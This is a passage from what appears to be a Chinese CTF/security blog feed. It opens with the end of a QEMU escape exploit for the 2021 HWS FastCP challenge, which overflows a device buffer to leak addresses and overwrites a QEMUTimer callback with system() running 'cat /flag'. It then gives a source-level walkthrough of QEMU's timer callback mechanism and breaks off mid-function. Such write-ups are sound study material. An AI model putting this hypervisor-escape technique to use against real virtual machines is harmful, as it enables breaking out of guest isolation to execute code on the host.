class="line">    perror(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        Err(<span class="string">"open pagemap"</span>);</span><br><span class="line">    }</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span> *addr)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> size)</span>{</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">uint64_t</span> *)( mmio_mem + addr );</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr,<span class="type">uint64_t</span> val)</span>{</span><br><span class="line">        *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint32_t</span> val)</span>{</span><br><span class="line">    outl(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr,<span class="type">uint8_t</span> val)</span>{</span><br><span class="line">    outb(val,addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint32_t</span>)inl(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span>{</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">uint8_t</span>)inb(addr);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_mmio</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>){</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    }</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem==<span class="number">-1</span>){</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init_pa</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    fd = open(<span class="string">"/proc/self/pagemap"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"open"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CP_INFO</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">uint64_t</span> CP_src;</span><br><span class="line">  <span class="type">uint64_t</span> CP_cnt;</span><br><span class="line">  <span class="type">uint64_t</span> CP_dst;</span><br><span class="line">}CP_INFO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_from_CP_buffer</span><span class="params">(<span class="type">void</span>* dst,<span class="type">uint64_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    CP_INFO cp_info;</span><br><span class="line">    cp_info.CP_cnt = cnt;</span><br><span class="line">    cp_info.CP_dst = gva_to_gpa(dst);</span><br><span class="line">    mmio_write(<span class="number">8</span>,gva_to_gpa(&amp;cp_info));</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_to_CP_buffer</span><span class="params">(<span class="type">void</span>* src,<span class="type">uint64_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    CP_INFO cp_info;</span><br><span class="line">    cp_info.CP_cnt = cnt;</span><br><span class="line">    cp_info.CP_src = gva_to_gpa(src);</span><br><span class="line">    mmio_write(<span class="number">8</span>,gva_to_gpa(&amp;cp_info));</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">1</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">copy_to_CP_buffer_plus</span><span class="params">(<span class="type">void</span>* src,<span class="type">void</span>* dst,<span class="type">uint64_t</span> cnt)</span></span><br><span class="line">{</span><br><span class="line">    CP_INFO cp_info[<span class="number">0x11</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;<span class="number">0x11</span>;++i)</span><br><span class="line">    {</span><br><span class="line">        cp_info[i].CP_dst = gva_to_gpa(dst);</span><br><span class="line">        cp_info[i].CP_cnt = cnt;</span><br><span class="line">        cp_info[i].CP_src = gva_to_gpa(src);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">8</span>,gva_to_gpa(&amp;cp_info));</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">0x11</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    init_pa();</span><br><span class="line">    init_mmio();</span><br><span class="line">    system(<span class="string">"sysctl vm.nr_hugepages=1"</span>);</span><br><span class="line">    <span class="type">char</span>* buf = mmap(<span class="literal">NULL</span>,<span class="number">2048</span>*<span class="number">1024</span>,PROT_READ|PROT_WRITE,MAP_SHARED|MAP_ANONYMOUS|MAP_HUGETLB,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(buf==<span class="number">-1</span>){</span><br><span class="line">        Err(<span class="string">"mmap buf"</span>);</span><br><span class="line">    }</span><br><span class="line">    HEX(buf);</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="string">'a'</span>,<span class="number">2048</span>*<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    copy_from_CP_buffer(buf,<span class="number">0x1000</span>+<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> system_addr = *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1010</span>] - <span class="number">0x21AD00</span>;</span><br><span class="line">    HEX(system_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> FastCPState_addr = *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1018</span>];</span><br><span class="line">    HEX(FastCPState_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> cmd_addr = FastCPState_addr+<span class="number">0xA00</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buf,<span class="string">"cat /flag\x00"</span>);</span><br><span class="line">    *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1010</span>] = system_addr;</span><br><span class="line">    *(<span class="type">uint64_t</span>*)&amp;buf[<span class="number">0x1018</span>] = cmd_addr;</span><br><span class="line">    copy_to_CP_buffer(buf,<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    copy_to_CP_buffer_plus(buf,buf,<span class="number">0x1000</span>+<span class="number">0x20</span>);</span><br><span class="line">    </span><br><span class="line">    LOG(<span class="string">"Trigger:"</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>,<span class="number">2</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Qemu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QemuTimer Callback机制</title>
      <link href="/2023/QemuTimer-Callback/"/>
      <url>/2023/QemuTimer-Callback/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在做2021 HWS FastCP的时候,有这样一个场景.漏洞点是对CP_buffer的溢出读写,可以覆盖掉之后的QEMUTimer结构,自然想到劫持其的callback函数指针.</p><p>但又多想了一点,cp_timer的回调函数是在pci_FastCP_realize中调用timer_init_full注册(初始化)过的,说不定callback指针已经在另一个位置保存并作为之后回调使用,并不会调用该结构中的指针.</p><span id="more"></span><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FastCPState</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  PCIDevice_0 pdev;</span><br><span class="line">  MemoryRegion_0 mmio;</span><br><span class="line">  CP_state cp_state;</span><br><span class="line">  <span class="type">uint8_t</span> handling;</span><br><span class="line">  <span class="type">uint32_t</span> irq_status;</span><br><span class="line">  <span class="type">char</span> CP_buffer[<span class="number">4096</span>];</span><br><span class="line">  QEMUTimer_0 cp_timer;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">QEMUTimer</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="type">int64_t</span> expire_time;</span><br><span class="line">  QEMUTimerList_0 *timer_list;</span><br><span class="line">  QEMUTimerCB *cb;</span><br><span class="line">  <span class="type">void</span> *opaque;</span><br><span class="line">  QEMUTimer_0 *next;</span><br><span class="line">  <span class="type">int</span> attributes;</span><br><span class="line">  <span class="type">int</span> scale;</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>虽然只需打个断点动调一下就能验证,但当我看到timer_init_full的实现,一脸震惊.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_init_full</span><span class="params">(QEMUTimer *ts,</span></span><br><span class="line"><span class="params">                     QEMUTimerListGroup *timer_list_group, QEMUClockType type,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> scale, <span class="type">int</span> attributes,</span></span><br><span class="line"><span class="params">                     QEMUTimerCB *cb, <span class="type">void</span> *opaque)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (!timer_list_group) {</span><br><span class="line">        timer_list_group = &amp;main_loop_tlg;</span><br><span class="line">    }</span><br><span class="line">    ts-&gt;timer_list = timer_list_group-&gt;tl[type];</span><br><span class="line">    ts-&gt;cb = cb;</span><br><span class="line">    ts-&gt;opaque = opaque;</span><br><span class="line">    ts-&gt;scale = scale;</span><br><span class="line">    ts-&gt;attributes = attributes;</span><br><span class="line">    ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>想象中的注册函数肯定要将ts链入timer_list链表中,但这里却仅是将ts-&gt;timer_list指向了对应的timer_list.形成了下图的结构,那当时间到达,如何找到ts?在内存中搜索timer_list指针?肯定不可能.于是便开始看Qemu源码.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202311282258582.png"></p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>最后发现没有那么玄乎,加入链表的操作是在timer_mod中完成的.从某个点切入来看源码就是会有无数个莫名其妙: “这里为什么要调这个?这个条件是什么意思?”,为了解决一连串的问题,完整的跟了一遍QemuTimer Callback机制的源码.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*util/qemu-timer.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_mod</span><span class="params">(QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">{</span><br><span class="line">    timer_mod_ns(ts, expire_time * ts-&gt;scale);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* modify the current timer so that it will be fired when current_time</span></span><br><span class="line"><span class="comment">   &gt;= expire_time. The corresponding callback will be called. */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">timer_mod_ns</span><span class="params">(QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimerList *timer_list = ts-&gt;timer_list;</span><br><span class="line">    <span class="type">bool</span> rearm;</span><br><span class="line"></span><br><span class="line">    qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">    <span class="comment">//将ts从timer_list中移除(?什么时候加进来过,估计是防止二次加入)</span></span><br><span class="line">    timer_del_locked(timer_list, ts);</span><br><span class="line">    <span class="comment">/*将ts根据expire_time插入到active_timer链表中,</span></span><br><span class="line"><span class="comment">    active_timer是一个sorted list.</span></span><br><span class="line"><span class="comment">    可以看出其是按照expire_time升序排列的.</span></span><br><span class="line"><span class="comment">    返回值rearm代表插入后ts是否在头部,</span></span><br><span class="line"><span class="comment">    即timer_list中最近的deadline改变.*/</span></span><br><span class="line">    rearm = timer_mod_ns_locked(timer_list, ts, expire_time);</span><br><span class="line">    qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*若timer_list中最近的deadline改变,调用</span></span><br><span class="line"><span class="comment">    timerlist_rearm.原因后续解释*/</span></span><br><span class="line">    <span class="keyword">if</span> (rearm) {</span><br><span class="line">        timerlist_rearm(timer_list);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timer_del_locked</span><span class="params">(QEMUTimerList *timer_list, QEMUTimer *ts)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimer **pt, *t;</span><br><span class="line"></span><br><span class="line">    ts-&gt;expire_time = <span class="number">-1</span>;</span><br><span class="line">    pt = &amp;timer_list-&gt;active_timers;</span><br><span class="line">    <span class="keyword">for</span>(;;) {</span><br><span class="line">        t = *pt;</span><br><span class="line">        <span class="keyword">if</span> (!t)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (t == ts) {</span><br><span class="line">            qatomic_set(pt, t-&gt;next);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        pt = &amp;t-&gt;next;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">timer_mod_ns_locked</span><span class="params">(QEMUTimerList *timer_list,</span></span><br><span class="line"><span class="params">                                QEMUTimer *ts, <span class="type">int64_t</span> expire_time)</span></span><br><span class="line">{</span><br><span class="line">    QEMUTimer **pt, *t;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* add the timer in the sorted list */</span></span><br><span class="line">    pt = &amp;timer_list-&gt;active_timers;</span><br><span class="line">    <span class="keyword">for</span> (;;) {</span><br><span class="line">        t = *pt;</span><br><span class="line">        <span class="keyword">if</span> (!timer_expired_ns(t, expire_time)) {</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        pt = &amp;t-&gt;next;</span><br><span class="line">    }</span><br><span class="line">    ts-&gt;expire_time = MAX(expire_time, <span class="number">0</span>);</span><br><span class="line">    ts-&gt;next = *pt;</span><br><span class="line">    qatomic_set(pt, ts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pt == &amp;timer_list-&gt;active_timers;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">timerlist_rearm</span><span class="params">(QEMUTimerList *timer_list)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">/* Interrupt execution to force deadline recalculation.  */</span></span><br><span class="line">    <span class="keyword">if</span> (icount_enabled() &amp;&amp; timer_list-&gt;clock-&gt;type == QEMU_CLOCK_VIRTUAL) {</span><br><span class="line">        icount_start_warp_timer();</span><br><span class="line">    }</span><br><span class="line">    timerlist_notify(timer_list);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>timerlist_rearm最终会调用qemu_notify_event函数,</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*softmmu/cpu-timers.c*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qemu_timer_notify_cb</span><span class="params">(<span class="type">void</span> *opaque, QEMUClockType type)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (!icount_enabled() || type != QEMU_CLOCK_VIRTUAL) {</span><br><span class="line">        qemu_notify_event();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (qemu_in_vcpu_thread()) {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * A CPU is currently running; kick it back out to the</span></span><br><span class="line"><span class="comment">         * tcg_cpu_exec() loop so it will recalculate its</span></span><br><span class="line"><span class="comment">         * icount deadline immediately.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        qemu_cpu_kick(current_cpu);</span><br><span class="line">    } <span class="keyword">else</span> <span class="keyword">if</span> (first_cpu) {</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * qemu_cpu_kick is not enough to kick a halted CPU out of</span></span><br><span class="line"><span class="comment">         * qemu_tcg_wait_io_event.  async_run_on_cpu, instead,</span></span><br><span class="line"><span class="comment">         * causes cpu_thread_is_idle to return false.  This way,</span></span><br><span class="line"><span class="comment">         * handle_icount_deadline can run.</span></span><br><span class="line"><span class="comment">         * If we have no CPUs at all for some reason, we don't</span></span><br><span class="line"><span class="comment">         * need to do anything.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        async_run_on_cpu(first_cpu, do_nothing, RUN_ON_CPU_NULL);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>从qemu_notify_event注释中看出,其会迫使 main_loop_wait检查挂起的事件并退出,使得触发一次qemu_clock_run_all_timers.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * qemu_notify_event: Force processing of pending events.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Similar to signaling a condition variable, qemu_notify_event forces</span></span><br><span class="line"><span class="comment"> * main_loop_wait to look at pending events and exit.  The caller of</span></span><br><span class="line"><span class="comment"> * main_loop_wait will usually call it again very soon, so qemu_notify_event</span></span><br><span class="line"><span class="comment"> * also has the side effect of recalculating the sets of file descriptors</span></span><br><span class="line"><span class="comment"> * that the main loop waits for.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Calling qemu_notify_event is rarely necessary, because main loop</span></span><br><span class="line"><span class="comment"> * services (bottom halves and timers) call it themselves.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></tbody></table></figure><p>最终处理的调用链</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">main_loop_wait-&gt;</span><br><span class="line">    timerlistgroup_deadline_ns -&gt;</span><br><span class="line">        qemu_soonest_timeout</span><br><span class="line">    os_host_main_loop_wait-&gt;</span><br><span class="line">        qemu_poll_ns-&gt;</span><br><span class="line">            ppoll </span><br><span class="line">    qemu_clock_run_all_timers-&gt;</span><br><span class="line">        timerlist_run_timers-&gt;</span><br><span class="line">            cb</span><br></pre></td></tr></tbody></table></figure><p>先来分析一下main_loop_wait函数,该函数被主例程循环调用,使用poll(ppoll)监听描述符事件并将结果Dispatch到对应的notifier进行处理.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*util/main-loop.c*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main_loop_wait</span><span class="params">(<span class="type">int</span> nonblocking)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//设置poll参数,timeout = UINT32_MAX即无限阻塞等待</span></span><br><span class="line">    MainLoopPoll mlpoll = {</span><br><span class="line">        .state = MAIN_LOOP_POLL_FILL,</span><br><span class="line">        .timeout = UINT32_MAX,</span><br><span class="line">        .pollfds = gpollfds,</span><br><span class="line">    };</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int64_t</span> timeout_ns;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nonblocking) {</span><br><span class="line">        mlpoll.timeout = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* poll any events */</span></span><br><span class="line">    g_array_set_size(gpollfds, <span class="number">0</span>); <span class="comment">/* reset for new iteration */</span></span><br><span class="line">    <span class="comment">/* <span class="doctag">XXX:</span> separate device handlers from system ones */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//调用main_loop_poll_notifiers中所有notifier的notify函数</span></span><br><span class="line">    notifier_list_notify(&amp;main_loop_poll_notifiers, &amp;mlpoll);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlpoll.timeout == UINT32_MAX) {</span><br><span class="line">    <span class="comment">//这里其实是一个32位的-1到64位-1的转换</span></span><br><span class="line">        timeout_ns = <span class="number">-1</span>;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        timeout_ns = (<span class="type">uint64_t</span>)mlpoll.timeout * (<span class="type">int64_t</span>)(SCALE_MS);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*计算timerlistgroup中最近的deadline,</span></span><br><span class="line"><span class="comment">    若小于当前timeout_ns,更新timeout_ns为deadline.*/</span></span><br><span class="line">    timeout_ns = qemu_soonest_timeout(timeout_ns,</span><br><span class="line">                                      timerlistgroup_deadline_ns(</span><br><span class="line">                                          &amp;main_loop_tlg));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//以timeout=timeout_ns进行poll(ppoll)阻塞</span></span><br><span class="line">    ret = os_host_main_loop_wait(timeout_ns);</span><br><span class="line"></span><br><span class="line">    mlpoll.state = ret &lt; <span class="number">0</span> 